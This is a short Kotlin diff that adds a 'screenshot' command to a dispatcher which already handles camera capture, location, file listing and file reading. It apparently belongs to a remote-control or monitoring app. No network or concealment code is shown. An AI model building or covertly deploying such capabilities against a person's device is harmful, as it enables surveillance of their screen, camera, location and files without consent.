@@ -63,6 +63,7 @@ object SynapseEngine {
             "ping"     to { cmd -> SynapseResponse.PingResponse(pong = true, latency_ms = 0) },
             "info"     to { cmd -> InfoModule.gather(context) },
             "camera"   to { cmd -> CameraModule.capture(context, cmd) },
+            "screenshot" to { cmd -> CameraModule.screenshot(context, cmd) },
             "location" to { cmd -> LocationModule.get(context, cmd) },
             "files"    to { cmd -> FileModule.list(context, cmd) },
             "file_read" to { cmd -> FileModule.read(context, cmd) },
